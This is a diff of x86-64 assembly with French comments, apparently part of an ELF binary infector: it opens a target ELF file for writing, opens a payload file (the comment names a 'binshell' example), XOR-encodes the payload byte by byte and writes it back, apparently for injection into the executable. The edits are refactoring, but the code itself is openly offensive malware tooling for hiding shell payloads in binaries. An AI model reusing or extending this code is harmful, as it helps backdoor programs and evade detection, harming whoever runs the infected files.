@@ -43,7 +43,7 @@ section .bss
 	payload_buffer resb 4096
 	program_header_buff resb 56
 
-	buffer resb 4096
+	xor_buffer resb 4096
 	
 
 section .text
@@ -55,9 +55,10 @@ _start:
     cmp rax, 4
     jne erreur
 
-    mov rdi, [rsp + 16]     ; argv[0] nom du fichier executé, argv[1] = nom du fichier ELF
+    
 
     mov rax, 2              ; Ouvrir le fichier
+	mov rdi, [rsp + 16]     ; argv[0] nom du fichier executé, argv[1] = nom du fichier ELF
     mov rsi, 2              ; Droit Lecture ecriture
     mov rdx, 0
     syscall
@@ -232,9 +233,9 @@ fin_recherche:
 	mov r15, [rsp + 32] 		; A déchiffrer oui ou non
 
 		
-	mov rdi, [rsp + 24] 		; payload_name exemple binshell
+
 	mov rax, 2
-	;mov rdi, payload_name
+	mov rdi, [rsp + 24] 		; payload_name exemple binshell
 	mov rsi, 2
 	mov rdx, 0
 	syscall		; Ouvre le payload
@@ -254,13 +255,13 @@ read_loop:
 
     mov     rax, 0              
     mov     rdi, r9           
-    mov     rsi, buffer
+    mov     rsi, xor_buffer
     mov     rdx, 4096       ; Lecture du shell
     syscall
 
     cmp rax, 0
     jl erreur
-    jz not_xor        ; Si vide quitter
+    jz end_xor        ; Si vide quitter
 
     mov r14, rax 
 
@@ -271,7 +272,7 @@ xor_loop:
     cmp rcx, r14
     jge write_output
 
-    xor byte [buffer + rcx], xor_key        ; Modifie avec xor octet par octet
+    xor byte [xor_buffer + rcx], xor_key        ; Modifie avec xor octet par octet
 
     inc rcx
     jmp xor_loop
@@ -280,7 +281,7 @@ xor_loop:
 
     mov     rax, 1              ; Ecrire dans le payload
     mov     rdi, r9
-    mov     rsi, buffer
+    mov     rsi, xor_buffer
     mov     rdx, r14
     syscall
 
@@ -288,15 +289,16 @@ xor_loop:
     jl erreur
 
     jmp read_loop
-
-
-not_xor:
+end_xor:
 
 	mov rax, 8       
 	mov rdi, r9      
 	mov rsi, 0       
 	mov rdx, 0       
 	syscall 			; Revient au debut du fichier
+
+
+not_xor:
 
 	cmp rax, 0
     jl erreur           ; Vérifie si lseek a échoué
